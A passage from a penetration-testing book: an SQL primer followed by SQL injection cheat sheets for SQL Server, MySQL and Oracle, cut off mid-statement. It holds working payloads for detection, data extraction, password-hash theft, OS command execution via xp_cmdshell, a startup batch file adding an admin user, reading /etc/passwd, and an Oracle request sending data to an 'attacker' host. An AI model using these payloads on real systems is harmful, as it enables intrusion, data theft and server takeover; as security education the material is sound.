trusted client running on a trusted computer to connect to and perform an investigation on a victim database server. q: will the same queries work against different rdbms products? a: no, most popular rdbms products support a bas e level of sql, however each have their own unique statements and functions. basic queries may work across multiple rdbms platforms however the queries required to gather database artifacts require specific database views and functions that are not common across platforms. ihttp://www.kaspersky.com/about/news/press/2009/kaspersky_lab_confirms_website_attack_verifies_no_data_was_comp romised iihttp://oracleflash.com/28/oracle- 11g-using-logminer- to-analyze-redo-log-files.html chapter 11 references gary o’leary -steele solutions in this chapter: • structured query language (sql) primer • sql injection quick reference • bypassing input validation filters • troubleshooting sql injection attacks • sql injection on other platforms • resources introduction this chapter contains a number of topics that should be useful reference items for understanding sql injection. these ran ge from a simple introduction to the basic structured query language (sql) itself, to helping you understand how sql works under normal circumstances, therefore helping you to rewrite sql statements in a way that continues to be syntactically correct. addi tionally, the chapter provides a series of sql injection cheat sheets for quickly jumping to the material you’re interested in, perhaps just to remind you how sql injection works or what the syntax is. i have also provided a table of troubleshooting tips w hich will assist you in overcoming the most commonly encountered problems when exploiting sql injection vulnerabilities. finally, you’ll find some information about databases not discussed in this book—we’ve used microsoft sql server, oracle, postgresql, a nd mysql in our examples so far, largely due to their widespread adoption in the real world. check out “sql injection on other platforms” for information about exploiting sql injection on platforms other than those outlined above. structured query language (sql) primer sql was originally developed at ibm in the early 1970s but was not officially formalized until 1986 by the american national standards institute (ansi). sql was initially designed as a data query and manipulation language with limited functionality when compared to today’s feature- rich sql dialects. in this section, i’ll provide a brief overview of the common sql queries, operators, and features. if you are already familiar with sql, you can skip this section. each major database vendor has ex tended the sql standard to introduce features specific to their own product. for our purposes, we will use the sql standard defined by the international organization for standardization (iso) since this will be valid for most database platforms. where necessary i will highlight platform- specific variations to the standard. sql queries sql queries are made up of one or more sql statements that are effectively instructions for the database server to carry out. the most common sql statements you will encounter when working with a database or performing sql injection are select , insert , update , create, union select , and delete. sql queries that are designed to read, delete, or update table data will often include a conditional clause to target specific rows in a table. a conditional clause begins with where followed by the condition. the or and and operators are used when multiple conditions are to be evaluated. for the purposes of this tutorial, each example query is aimed at the tblusers table unless otherwise specified. table 11.1 outlines the structure of the tblusers table. table 11.1 example sql table, tblusers select statement the primary role of the select statement is to retrieve data from a database and return it to the application or user. as a basic example, the following sql statement will return data from every row and column within the tblusers table: select ∗ from tblusers the asterisk ( ∗) character is a wildcard that instructs the database server to return all data. if only specific columns are required, the name of each column is listed in place of the wildcard. the following example will return the username column for all rows within tblusers : select username from tblusers to return specific rows from a table based on conditional criteria, you can add the where clause followed by the desired condition. for example, the following sql query will return all rows that have a u sername value of admin and a password value of letmein : select ∗ from tblusers where username =‘ admin’ and password = ‘letmein’ microsoft sql server also allows you to use select statements to read table data from one table and insert it into another. in t he following example, all data from the tblusers table is copied into the hackertable table: select ∗ into hackertable from tblusers union operator you use the union operator to combine the result sets of two or more select statements. all select statements within the union must return the same number of columns and their data type must be compatible. in the following example, the sql query will combine the username and password columns from the tblusers and tbladmins tables: select username, password from tblusers union select username, password from tbladmins union select will automatically compare the values returned by each select statement and return only distinct values. to permit duplicates and prevent the database from comparing the returned data, use union all select : select username, password from tblusers union all select username, password from tbladmins insert statement as you have probably guessed already, you use the insert statement to insert data into a table. you can structure the i nsert statement in two different ways to achieve the same goal. the following insert statement will insert the values 5, john, smith , and 0 into the tblusers table: insert into tblusers values (5,‘john’,‘smith’,0) in this example, the data to be inserted i nto the table is arranged in the correct order to correspond with each column in the table. the most significant problem with this approach is that if the table structure is changed (e.g. columns are added or deleted) data could be written to the wrong col umn. to avoid potentially harmful mistakes the insert statement can accept a comma- separated list of target columns following the table name: insert into tblusers(id, username, password, priv) values (5, ‘john’,‘smith’,0) in this example, each target colum n is listed to ensure that the supplied data is inserted in the correct column. if the table structure changes, the insert statement will still target the correct columns. update statement you use the update statement to modify existing data within a datab ase table. the following update statement will change the priv column value to 0 for all records that have the username value of sarah: update tblusers set priv=0 where username = ‘sarah’ it is important to note that all update statements should include a where clause to indicate which rows should be updated. if you omit the where clause, all rows are affected. delete statement you use the delete statement to delete rows from a table. the following delete statement will delete all rows from tblusers that have a username value of admin: delete from tblusers where username = ‘admin’ it is important to note that all delete statements should include a where clause to indicate which rows should be deleted. if you omit the where clause, all rows will be deleted . notes from the underground... dangerous sql injection test cases one of the most common methods of detecting a sql injection vulnerability is to insert a conditional clause and observe the differences in application behavior . for example, injecting the statement or 1=1 into the where clause of a select statement could dramatically change the number of results returned by the query. consider the following three sql statements. the first represents the original query, and the s econd and third have been modified via sql injection. select story from news where id=19 select story from news where id=19 or 1=1 select story from news where id=19 or 1=2 when executed, the first sql statement returns the story column from the news table that has an id value of 19. the second, modified query returns every story in the database, since 1 will always equal 1, and the third query returns the same data as the first query, since 1 does not equal 2. from the attacker’s perspective, the vulnerabl e application responds differently to each modified query, and therefore indicates the presence of a sql injection flaw; so far so good. unfortunately, this approach can have devastating consequences if the vulnerable query happens to be an update or delet e statement. consider a password reset feature that is vulnerable to sql injection. under normal operation, the password reset component accepts an e- mail address as its input and executes the following query to reset the user’s password: update tblusers s et password=‘letmein’ where emailaddress=‘someuser@victim.com’ now consider that we have injected the string ‘ or 1=1 -- into the e -mail address field. the sql statement now reads: update tblusers set password=‘letmein’ where emailaddress=’’ or 1=1--’ the m odified statement now updates the password field for every record in the table since the effective condition is where 1=1. time to restore from backup! or as was the case when this actually occurred, time to inform the client and be beaten with a stick. to prevent this from happening to you, first try to understand the query you are injecting into. ask yourself: “could this be an update or delete statement?” for example, the password reset and unsubscribe components are likely to be manipulating or deleti ng data, and therefore you should proceed with caution. using tools such as owasp zed attack proxy and other automated sql injection tools can have the same consequences since they often inject statements such as or 1=1. ensure that all data is backed up b efore performing an assessment! drop statement you can use the drop statement to delete database objects such as tables, views, indexes, and in some cases, even the database itself. for example, the following sql statement will drop the tblusers table: drop table tblusers create table statement you use the create table statement to create a new table in the current database or schema. column names along with their data type are passed within parentheses following the table name. the following sql statement will create a new table named shoppinglist with two columns, item and name : create table shoppinglist(item int, name varchar(100)) oracle allows you to create a table and populate it with data from another table or view: create table shoppinglist as select ∗ from dba_users alter table statement you can use the alter table statement to add, delete, or modify a column within an existing table. the following sql query would add a column named comments to the tblusers table: alter table tblusers add comments varchar(100) the following sql statement will remove the comments column: alter table tblusers drop column comments the following sql statement will modify the data type of the comments column from varchar(100) to varchar(500) : alter table tblusers alter col umn comments varchar(500) group by statement you typically would use the group by statement when performing an aggregate function such as sum against a column in a table. for example, consider that you would like to perform a query against the following orders table ( table 11.2) to calculate the total cost for customer anthony anteater. table 11.2 orders table the following statement will automatically group orders received from user anthony anteater and then perfor m a sum operation against the cost column: select customer,sum(cost) from orders where customer = ‘anthony anteater’ group by customer order by clause you use the order by clause to sort the results of a select statement by a specific column; it accepts either a column name or a number as a mandatory parameter. it is possible to add the keyword asc or desc to sort the results in an ascending or descending order, respectively. the following sql statement will sele ct the cost and product columns from the orders table and sort the results by the cost column in descending order: select cost, product from orders order by cost desc limiting the result set when performing sql injection attacks you will often need to limi t the number of table rows returned by your injected query (e.g. when extracting data via error messages). the syntax for selecting a specific row from a table varies among database platforms. table 11.3 details the sql syntax for selecting the first and fifth rows from the tblusers table. table 11.3 limiting the result set platform query microsoft sql server selecting the first row: select top 1 ∗ from tblusers selecting the fifth row: select top 1 ∗ from (select top 5 ∗ from tblusers order by 1 asc) randomstring order by 1 desc; mysql selecting the first row: select ∗ from tblusers limit 1,1 selecting the fifth row: select ∗ from tblusers limit 5,1 oracle selecting the username column from the first row in the tblusers table: select username from (select rownum r, username from tblusers order by 1) where r=1; platform query select username from tblusers where rownum=1; selecting the username column from the fifth row in the tblusers ta ble: select username from (select rownum r, username from tblusers order by 1) where r=5; postgresql selecting the username column from the first row in the tblusers table: select username from tblusers order by username limit 1 offset 0; selecting th e username column from the fifth row in the tblusers table: select username from tblusers order by username limit 1 offset 4; for other database platforms check your vendor documentation. sql injection quick reference this section provides a quick referenc e of some of the most common sql queries and techniques you will need when exploiting a sql injection vulnerability. we’ll start by looking at some of the techniques employed to identify the database platform and then provide a sql injection cheat sheet fo r each of the most common database platforms. you’ll find additional cheat sheets for less common platforms toward the end of this chapter, in “sql injection on other platforms.” identifying sql injection vulnerabilities table 11.4 covers the common techniques used when attempting to identify a sql injection flaw. any of the proposed methodologies can be used in isolation, however by combining multiple tests you can improve the accuracy of detection . table 11.4 discoveri ng sql injection flaws methodology descriptio n does malformed input yield a database error? entering sql metacharacters or a malformed/unexpected data type may result in a database error. common test cases include a single- quote (‘) character within a string field or random string within a numeric field.errors can usually be recognized via a http status code of 500 and/or a descriptive error message within the page. submitting malformed data and analyzing the server’s response for the following strings could help identify a sql injection vulnerability. microsoft ole db provider ora- pls- error in your sql syntax 80040e14 sql error incorrect syntax near sqlserver failed mysql unclosed quotation mark jdbc driver odbc driver sql odbc if errors are encountered, change the entered data to try to resolve the error and determine if the data you entered caused a sql syntax violation. for example, double up single -quote characters —if one quote raises the error but two do not, it is likely th at you have uncovered an sql injection flaw.note that an error resulting from an unexpected data type can be expected and normal behavior. for example many applications will raise an error if string data is supplied where a numeric is expected. further techniques should be adopted to confirm the existence of a sql injection vulnerability. can legitimate, expected input be substituted for an equivalent sql expression? before deploying this detection technique it is important to determine if the input you are testing has an effect on the servers response. for example, if a numeric value is being supplied, try a different numeric value and determine if measureable and consistent difference occurs. for string values, change the value to a random string using the same character set and length and observe the applications response. if modification to the data does not produce a consistent difference to the methodology descriptio n page length, content or http response code, this technique is unlikely to succeed. numeric data for this example we will assume that we are testing a numeric id parameter passed to the news.php script. the following two requests produce different responses thereby confirming that the id parameter is dynamic and can be used for this test methodology; http://target/news.php?id=1 http://target/news.php?id=2 the next step in this process is to submit a sql expression that will evaluate to one of our confirmed good values (1 an d 2 in the above example). the response to each expression can then be compared to our initial test response to determine if the expression is being evaluated. a common sql function to use in this type of testing is ascii(), this function will return a int eger for a supplied ascii character. therefore, the following sql expression should return the value 1 (the ascii code for “2” is 50); 51-ascii(2) if our input is being interpreted insecurely by the sql server, the following requests should be equivalent t o our original requests: http://target/news.php?id=51- ascii(2)-- equivalent to id=1 http://target/news.php?id=52- ascii(2)-- equivalent to id=2 the “ascii()” function is supported by most mainstream platforms including; microsoft sql server, oracle, mysql, and postgresql.try similar mathematical expressions to confirm your results. string data when dealing with string data we adopt a similar approach to that used when assessing numeric parameters. as before, the first step is to obtain a valid value from the application and confirm that the services response consistently differs when the value is changed. for the purpose of this example we assume that t he following request parameter values yield different results: http://target/products.asp?catagory=shoes http://target/products.asp?catagory=blahfoo methodology descriptio n a common strategy when testing string data is to divide the string into two or more fragments and then use sql syntax to concatenate the fragments server side. one important caveat to this approach is that we need to customize our concatenation syntax depe nding on the database platform. since we may not know this ahead of time, a typical approach might be to initially target common platforms such as microsoft sql server, oracle, and mysql. the following url’s implement concatenation in an attempt to recreat e the parameter value “shoes”: microsoft sql server http://target/products.asp?catagory=sho’%2b’es (%2b is a url encoded +) oracle / postgresql http://target/products.asp?catagory=sho’||’es mysql http://target/products.asp?catagory=sho’%20’es (%20 is a url encoded space character) changing the value either side of the concaten ation operator should invalidate the input and retrieve a result consistent with any other random string. see table 11.6 for further concatenation operators. does the addition of a sql conditional expression result in a consistent difference within the server’s response? statistically speaking, the majority of sql injection flaws occur when user-supplied data is insecurely included within an operand passed to a where clause. as an example, consider the following url and resulting sql query: url: http://targetserver/news.php?id=100 sql: select ∗ from news where article_id=100 under normal operation, the example above will retrieve and display the news article that ha s an “article_id” value of 100. however, if the “id” parameter is vulnerable to sql injection the following requests should provide different results: methodology descriptio n url 1: http://targetserver/news.php?id=100 and 1=1 url 2: http://targetserver/news.php?id=100and 1=2 by adding “and 1=1” we should see no change within the page since logically the expression does not change the outcome of the where clause: select ∗ from news where article_id=100 and 1=1 conversely, adding “and 1=2” will mean that the where clause does not match any record in the database: select ∗ from news where article_id=100 and 1=2 by manipulating the servers response using this technique we can often identify the presence of a sql injection vulnerability. in some cases you may need to close parenthesis or break out of quote -delimited data to use this technique. for example, the following sequences could be used: ‘ and ‘a’=’a vs ‘ and ‘a’=’b ‘ and 1=1- - vs ‘ and 1=2 -- ) and 1=1-- vs ) and 1=1 -- ‘) and 1=1 -- vs ‘) and 1=2-- is it possible to trigger a measurable time delay? triggering a measurable time delay via sql injection can be used to both confirm the existence of a flaw and in most cases fingerprint the back -end database. functions used to generate time delays are covered in table 1 1.5 within this chapter. identifying the database platform a common first task when exploiting a sql injection flaw is to identify the back -end database platform. in many cases, you may have already made an educated guess based on the presentation server platform and scripting language. for example, a microsoft internet information server (iis) server presenting an asp.net application is most likely integrated with microsoft sql server; using the same principle, an apache -hosted php application is most like ly integrated with a mysql server. by grouping technologies together in this way, it is possible to approach a sql injection flaw with a good idea of the database platform you are attacking. however, if your injected sql doesn’t quite work out to plan, it may be necessary to identify the database platform using a more scientific approach. identifying the database platform via time delay inference generating a time delay based on server -specific functionality is a long -standing method of identifying the database platform. table 11.5 lists the functions or procedures for generating measurable time delays across th e most popular database platforms. table 11.5 generating a time delay platform time dela y microsoft sql server waitfor delay ‘0:0:10’ oracle begin dbms_lock.sleep(5);end;-- (pl/sql injection only) select utl_inaddr.get_host_name(‘192.168.0.1’) from dual select utl_inaddr.get_host_address(‘foo.nowhere999.zom’) from dual select utl_http.request(‘http://www.oracle.com’) from dual mysql benchmark(1000000,md5(“hack”)) -- prior to version 5.0.12 sleep(10); -- version 5.0.12 and above postgresql select pg_sleep(10);-- version 8.2 and over create or replace function pg_sleep(int) returns int as ‘/lib/libc.so.6’, ‘sleep’ language ‘c’ strict; -- create pg_sleep function on linux. requires postgres/pgsql level privileges another similar approach involves submitting “heavy queries” designed to consume the processor for a measurable length of time. since there are deviations within each vendor’s implementation of sql, it is possible to construct a heavy q uery that will execute successfully on only one specific platform. microsoft published an article on the subject in september 2007 that you can find at http://technet.microsoft.com/en -us/library/cc512676.aspx . identifying the database platform via sql dialect inference there are several deviations between each vend or’s sql implementation that you could use to help identify the database server. a common method for narrowing down the list of potential database platforms is to assess how the target server deals with platform -specific sql syntax. table 11.6 lists the common functions, comment character sequences, and default tables that could be used to identify the database platform. table 11.6 sql dialect deviations for example, if you suspect that the database platform is microsoft sql server, mysql, oracle, or postgresq l you could inject the following statements to identify the database server. in each case the injected statement will only succeed on its intended database platform and will raise an error on all others, each example is equivalent to the injection string; ’ and 1=1--:microsoft sql server ’ and @@pack_received = @@pack_received -- mysql ’and connection_id() = connection_id() -- oracle’ and bitand(1,1) = bitand(1,1) – postgresql ’ and getpgusername() = getpgusername()-- extracting data via error messages the f ollowing examples will raise an error and include the database version string within the resulting error message. the initial “and” within each example should be amended where necessary, in some cases using “or” in place of “and” is required. microsoft sql server and 1 in ( select @@version) -- and 1=convert(int,(select @@version)) -- mysql and (select 1 from (select count( ∗),concat((select version() ),floor(rand(0)∗ 2))x from information_schema.tables group by x)a)# oracle and 1=(utl_inaddr.get_host_name((select banner from v$version where rownum=1))) -- and 1=ctxsys.drithsx.sn(1, (select banner from v$version where rownum=1 ))-- postgresql and 1=cast((select version())::text as numeric) -- combining multiple rows into a single row when you are exploiting a s ql injection vulnerability you will often face the challenge that only one column and one row can be returned at a time (e.g. when data is being returned via http error messages). to bypass this restriction it is possible to concatenate all rows and columns into a single string. table 11.7 provides examples of how you can achieve this across microsoft sql server, oracle, and mysql. table 11.7 sql combining multiple rows microsoft sql server cheat sheet microsoft sql server is one of the most common database platforms in use today. historically, microsoft sql server has been one of the easier platforms to exploit via sql injection. this is mainly thanks to a host of powerful -extended stored procedures and verbose error reporting on the microsoft platform. this section provides a quick reference of common sql statements used in sql injection attacks against microsoft sql server . enumerating database configuration information and schema table 11.8 lists the sql statements you can use to extract key configuration information. table 11.9 lists the sql statements used to enumerate microsoft sql server schema information. table 11.8 extracting microsoft sql server configuration information data query version select @@version; current user select system_user; select suser_sname(); select user; select loginame from master..sysprocesses where spid =@@spid; list users select name from master..syslogins; current user privileges (returns 1 if the user is sysadmin and 0 if the user does not have sysadmin privileges) select is_srvrolemember(‘sysadmin’); database server host name select @@servername; select serverproperty(‘productversion’), serverproperty (‘productlevel’), serverproperty (‘edition’); -- sql server 2005 only table 11.9 extracting the microsoft sql server schema blind sql injection functions: microsoft sql server table 11.10 lists functions that are useful when performing blind sql injection attacks. table 11.10 blind sql injection functions data query string length len() extract substring from a given string substring(string,offset,length) string ( ‘abc’ ) representation with no single quotes select char(0x41) + char(0x42) + char(0x43); trigger time delay waitfor delay ‘0:0:9’;-- triggers 9 second time delay if statement if (1=1) select ‘a’ else select ‘b’ -- returns ‘a’ microsoft sql server privilege escalation this section covers some of the generic privilege escalation attacks that can be performed against the microsoft sql server platform. over the years, a number of vulnerabilities have been discovered and publicly disclosed that could be used to elevate privileges. however, since microsoft regularly patches vulnerabilities within the database platform, any list produced here would be out of date by the time this book is published. to learn more about the most recent vulnerabilities affecting the microsoft sql server platform, search a popular vulnerability database such as www.secunia.com or www.securityfocus.com . table 11.11 maps the version number stored within the @@version variable to an actual release and service pack number. see the following microsoft knowledge based article for further details: http://support.microsoft.com/kb/937137/en- us. table 11.11 microsoft sql server version numbers version number service pack version number service pack 9.00.3042 microsoft sql server 2005 sp2 9.00.2047 microsoft sql server 2005 sp1 9.00.1399 microsoft sql server 2005 8.00.2039 microsoft sql server 2000 sp4 8.00.818 microsoft sql server 2000 sp3 w/ cumulative patch ms03- 031 8.00.760 microsoft sql server 2000 sp3 8.00.532 microsoft sql server 2000 sp2 8.00.384 microsoft sql server 2000 sp1 8.00.194 microsoft sql server 2000 7.00.1063 microsoft sql server 7.0 sp4 7.00.961 microsoft sql server 7.0 sp3 7.00.842 microsoft sql server 7.0 sp2 7.00.699 microsoft sql server 7.0 sp1 version number service pack 7.00.623 microsoft sql server 7.0 6.50.479 microsoft sql server 6.5 sp5a update 6.50.416 microsoft sql server 6.5 sp5a 6.50.415 microsoft sql server 6.5 sp5 6.50.281 microsoft sql server 6.5 sp4 6.50.258 microsoft sql server 6.5 sp3 6.50.240 microsoft sql server 6.5 sp2 6.50.213 microsoft sql server 6.5 sp1 6.50.201 microsoft sql server 6.5 rtm openrowset reauthentication attack many microsoft sql applications that i have encountered are configured to use an application -specific user account with limited privileges. however, the same applications are often integrating with a sql server that has a weak sa (system administrator) acc ount password. the following openrowset query will attempt to connect to sql server with address 127.0.0.1 using the sa account with a password of letmein : select ∗ from openrowset(‘ sqloledb’ ,‘127.0.0.1’ ;‘sa’;‘letmein’ ,‘set fmtonly off execute master..xp_cmdshell “dir”’)-- a scripted injection attack that switches out the password value for common dictionary words could be used to launch an attack against the local sa account. furthermore, the sql server internet protocol (ip) address parameter could be used to iterate through the local network ip range in search of sql servers with a weak sa password. tip the burp intruder feature of the burp suite from www.portswigger.net is ideal for performing this type of attack. to launch a dictionary attack against the sa user account use the sniper attack type along with a preset list payload set (containing a list of common passwords). to launch an attack for local sql servers use the numbers payload set to iterate through the local ip range. by default, the openrowset function is disabled on sql server 2005. this can be reenabled if the application user is the database owner (dbo) for t he master database: exec sp_configure ‘show advanced options’, 1 exec sp_configure reconfigure exec sp_configure ‘ad hoc distributed queries’, 1 exec sp_configure reconfigure attacking the database server: microsoft sql server this section details attacks against the database server host such as code execution and local file access. all of the attacks detailed here assume that you are attacking the database server over the internet via a sql injection vulnerability. system comma nd execution via xp_cmdshell microsoft sql server 7, 2000, and 2005 include an extended stored procedure named xp_cmdshell that can be called to execute operating system commands. when attacking sql server versions 2000 and earlier, the following sql state ment can be executed by the dbo of the master database (e.g. the sa user): exec master.dbo.xp_cmdshell ‘os command’ for sql server version 2005, the xp_cmdshell stored procedure is disabled by default and must first be reenabled using the following sql: exec sp_configure ‘show advanced options’, 1 exec sp_configure reconfigure exec sp_configure ‘xp_cmdshell’, 1 exec sp_configure reconfigure if the xp_cmdshell stored procedure has been dropped but the .dll has not been deleted, the following will reenable it : exec sp_addextendedproc ‘xp_cmdshell’, ‘xpsql70.dll’ exec sp_addextendedproc ‘xp_cmdshell’, ‘xplog70.dll’ xp_cmdshell alternative as an alternative to the xp_cmdshell stored procedure, you can execute the following sql statements to achieve the same effect: declare @altshell int exec sp_oacreate ‘wscript.shell’,@altshell output exec sp_oamethod @altshell,‘run’,null, ‘%systemroot%\\ system32\\ cmd.exe /c’ to execute this alternative shell on microsoft sql server 2005 you will first need to execute the followin g sql: exec sp_configure ‘show advanced options’, 1 exec sp_configure reconfigure exec sp_configure ‘ole automation procedures’, 1 exec sp_configure reconfigure cracking database passwords microsoft sql server 2000 password hashes are stored within the sys xlogins table and you can extract them using the following sql statement: select user,password from master.dbo.sysxlogins the result of the preceding query looks something like the following: sa, 0x0100236a261ce12ab57ba22a7f44ce3b780e52098378b65852892eee91c0784b911d76 bf4eb124550acabdfd1457 the long string beginning with 0x0100 can be dissected as follows. the first four bytes following the 0x are constant; the next eight bytes are the hash salt —in this example, the salt value is 236a261c . the remaining 80 bytes are actually two hashes; the first 40 bytes are a case- sensitive hash of the password, and the second 40 bytes are an uppercased versio n. here is the case -sensitive hash: e12ab57ba22a7f44ce3b780e52098378b6585289 and here is the case -insensitive hash: 2eee91c0784b911d76bf4eb124550acabdfd1457 the salt and either (or both) password hashes can be loaded into cain & abel ( www.oxid.it ) to launch a dictionary or brute force attack against the password. microsoft sql server 2005 hashes microsoft sql server 2005 does not store a case -insensitive version of the password hash; however, the mixed -case version is stil l accessible. the following sql statement will retrieve the password hash for the sa account: select password_hash from sys.sql_logins where name=‘sa’ select name + ‘- ’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins the following example hash value includes a four -byte constant ( 0x0100), an eight -byte salt (4086ceb6), and a 40 -byte mixed -case hash (beginning with d8277): 0x01004086ceb6d8277477b39b7130d923f399c6fd3c6bd46a0365 file read/write it is possible to read local files provid ing you have insert and administer bulk operations permissions. the following sql will read the local file c: \\boot.ini into the localfile table: create table localfile(data varchar(8000)); bulk insert localfile from ‘c: \\boot.ini’; you can then extract data back out from the localfile table using a select statement. if you are extracting table data out via error messages, you may be limited to one row per query. in this case, you may need a point of reference to select each row one by one. you can use the alter table statement to add an auto -incrementing identity column to the localfile table. the following sql statement will add an identity column named id with an initial value of 1, incrementing with each row in the table: alter table localfile add id int i dentity(1,1); data can now be extracted by referencing the id column. for example: select data from localfile where id = 1; select data from localfile where id = 2; select data from localfile where id = 3; mysql cheat sheet mysql is a popular open source database platform commonly implemented alongside php and ruby on rails applications. this section provides a quick reference of common sql statements used in sql injection attacks against mysql server. enumerating database configuration information and schema table 11.12 lists sql statements used to extract key configuration information. table 11.13 lists the sql statements used to enumerate schema information from mysql 5.0 and later. table 11.12 extracting mysql server configuration information data query data query version select @@version current user select user(); select system_user(); list users select user from mysql.user; current user privileges select grantee, privilege_type, is_grantable from information_schema.user_privileges; table 11.13 extracting schema information from mysql 5.0 and later data query current database select database() list databases select schema_name from information_schema.schemata; list tables list tables within the current database: select table_name from information_schema.tables where table_schema = database() list all tables for all user -defined databases: select table_schema,table_name from information_schema.tables where table_schema != ‘information_schema’ and table_schema != ‘mysql’ list columns list columns within a specific table: select column_name from information_schema.columns where table_name =‘tblusers’# data query returns columns from tblusers list all columns for all user -defined tables: select table_schema, table_name, column_name from information_schema.columns where table_schema != ‘information_schema’ and table_schema !=‘mysql’ blind sql injection functions: mysql table 11.14 lists functions that are useful when performing blind sql injection attacks. table 11.14 blind sql injection functions data query string length length() extract substring from a given string select substr(string, offset, length); string ( ‘abc’ ) representation with no single quotes select char(65,66,67); trigger time delay benchmark(1000000,md5(“hack”)); # triggers a measurable time delay sleep(10); # triggers a 10- second time delay (mysql version 5 and later) if statement select if(1=1,‘a’,‘b’); -- returns ‘a’ attacking the database server: mysql unlike microsoft sql s erver, mysql does not contain any built -in procedures for executing operating system commands. there are, however, a number of strategies that could lead to remote system access. this section describes some of the strategies that could be employed to gain remote code execution and/or read and write local files. system command execution it is possible to execute operating system commands by creating a malicious script file on the target server that will be routinely executed. the following syntax is used to write local files from within mysql: select ‘system_commands’ into dumpfile trojanpath the following statement would create a batch file within the windows startup directory designed to add administrative user x with a password of x : select ‘net user x x /add%26%26 net localgroup administrators x /add’ into dumpfile ‘c:\\ \\documents and settings\\ \\all users \\\\start menu\\ \\programs \\\\startup\\ \\attack.bat’ tools & traps... planting trojans via union select when using union select to create your trojan script, you must write to your target file all the data the original sql query selects before your indented system commands. this could be problematic since the data selected by the original query may stop the trojan from executing correctly. to overcome this, ensure that the query you are injecting into does not return any data of its own. appending and 1=0 should do the trick. cracking database passwords you can extract user password hashes from the mysql.user table as long as your current user account has the required privileges (by default, the root user account has sufficient privileges). to return a colon- separated list of usernames and password hashes execute the following statement: select concat(user,“:”,password) from mysql.user password hashes can then be cracked using cain & abel or john the ripper (www.openwall.com/john/ ). attacking the database directly you can execute code by directly connecting to the m ysql server and creating a user -defined function. you can download a tool to perform this attack from the following web sites: • windows: www.scoobygang.org/hiddenwarez/mexec.pl • windows: www.0xdeadbeef.info/exploits/raptor_winudf.tgz • unix -based: www.0xdeadbeef.info/exploits/raptor_udf.c file read the mysql lo ad_file function returns a string containing the contents of a specified file. the database user requires the file_priv privilege to invoke this function. to view the /etc/passwd file on unix hosts the following syntax could be used: select load_file(‘/etc/passwd’); if magic_quotes_gpc is enabled, you can represent the file path using a hexadecimal string to avoid using single -quote characters: select load_file(0x2f6574632f706173737764);# loads /etc/passwd you can use a tool called sqldumper written by anto nio “s4tan” parata to read file contents via blind sql injection. sqldumper is available for download at www.ictsc.it/site/it/projects/sqldumper/sqldumper.php . file write the mysql “into dumpfile” directive can be added to any select statement to direct the resulting records to an external file (permissions permitting). this feature could be abused by a malicious attacker to create a backdoor script with a web accessible di rector or a trojan script that will be routinely executed. the following query will select all data from ‘mytable’ and write its output to /tmp/hacker: select ∗ from mytable into dumpfile ‘ /tmp/hacker ’; oracle cheat sheet the oracle database is typically i mplemented for large -scale applications where database performance or high availability is a key requirement. enumerating database configuration information and schema table 11.15 lists sql statements used to extract k ey configuration information. tables 11.16 and 11.17 list the sql statements used to enumerate oracle schema information. table 11.15 extracting oracle server configuration informa tion data query version select banner from v$version; current user select user from dual; list users select username from all_users order by username; current user privileges select ∗ from user_role_privs; select ∗ from user_tab_privs; select ∗ from user_sys_privs; select sys_context(‘userenv’, ‘isdba’) from dual; select grantee from dba_sys_privs where privilege = ‘select any dictionary’; appserver host name select sys_context(‘userenv’, ‘host’) from dual; select sys_context(‘userenv’, ‘server_host’) from dual; database server host name select utl_inaddr.get_host_name from dual establish external select utl_http.request(‘http://attacker:1000/’||(select banner from v$version where rownum=1)) from dual establishes an http connection over port 1000 to the host; attacker , the data query connections http request, contains the oracle version banner within the request path. raise an error raise an error containing the version banner and (utl_inaddr.get_host_name((select banner from v$version where rownum=1)))=1 table 11.16 extracting oracle database schema data query database name select global_name from global_name; list schema/users select username from all_users; list table names and their schema select owner,table_name from all_tables; list columns select owner, table_name, column_name from all_tab_columns where table_name = ‘tblusers’; table 11.17 encryption in the database data query encrypted tables select table_name, column_name, encryption_alg, salt from dba_encrypted_columns; since oracle 10g, you can use transparent encryption for tables. for performance reasons, only the most important columns are usually encrypted. data query list objects using crypto libraries select owner, name, type, referenced_name from all_dependencies; --show objects using database encryption (e.g. for passwords in ‘dbms_crypto’and ‘dbms_obfuscation_toolkit’) list pl/sql functions containing the string ‘crypt’ select owner,object_name,procedure_name from all_procedures where (lower(object_name) like ‘%crypt%’ or lower(procedure_name) like ‘%crypt%’) and object_name not in (‘dbms_obfuscation_toolkit’,‘dbms_crypto_toolkit’) blind sql injection functions: oracle table 11.18 lists functions that are useful when performing blind sql injection attacks. table 11.18 blind sql injection functions data query string length length() extract substring from a given string select substr(string, offset, length) from dual; string ( ‘abc’ ) representation with no single quotes select chr(65) || chr(66) || chr(67) from dual; select concat(chr(65),concat(chr(66),chr(67))) from dual; select upper((select substr(banner,3,1)||substr(banner,12,1)||substr(banner,4,1) from v$version where rownum=1 )) from dual; trigger time delay select utl_inaddr.get_host_address(‘nowhere999.zom’) from dual; -- triggers measurable time delay attacking the database server: oracle in oracle, there are two different types of injection: traditional sql injection and pl/sql injection. in pl/sql injection you can execute entire pl/sql blocks, and in traditional sql injection it is typically possible to modify only a single sql statement. command execution you can use the following scripts, written by marco ivaldi, to achieve system command execution and local file read/write access: • www.0xdeadbeef.info/exploits/rapt or_oraexec.sql • www.0xdeadbeef.info/exploits/raptor_oraextproc.sql reading local files here are some pl/sql code examples for reading local files from the oracle server: reading local files: xmltype create or replace directory getpwdir as ‘c:\\ app\\root\\product\\ 11.1.0\\db_1\\owb\\j2ee\\config’; select extractvalue(value(c), ‘/connection -factory/@user’)||‘/’||extractvalue(value(c), ‘/connection- factory/@password’)||‘@’||substr(ex tractvalue(value(c), ‘/connectionfactory/@url’),instr(extractvalue(value(c), ‘/connection- factory/@url’),‘//’)+2) conn from table( xmlsequence( extract( xmltype( bfilename(‘getpwdir’, ‘data -sources.xml’), nls_charset_id(‘we8iso8859p1’) ), ‘/data-sources/connection- pool/connection -factory’ ) ) ) c / reading local files: oracle text create table files (id number primary key,path varchar(255) unique,ot_format varchar(6)); insert into files values (1, ‘c:\\ boot.ini’, null); --insert the columns to be read into the table (e.g. via sql injection) create index file_index on files(path) indextype is ctxsys.context parameters (‘datastore ctxsys.file_datastore format column ot_format’); -- retrieve data (boot.ini) from the fulltext index select token_text from dr$file_index$i; reading local files (pl/sql injection only) the following examples will work only when performing a pl/sql injection attack. in the vast majority of cases, yo u will need to connect to the database directly to execute pl/sql blocks. reading local files: dbms_lob create or replace directory ext as ‘c: \\’; declare buf varchar2(4096); begin lob_loc:= bfilename(‘media_dir’, ‘aht.txt’); dbms_lob.open (lob_loc, dbms_lob.lob_readonly); dbms_lob.read 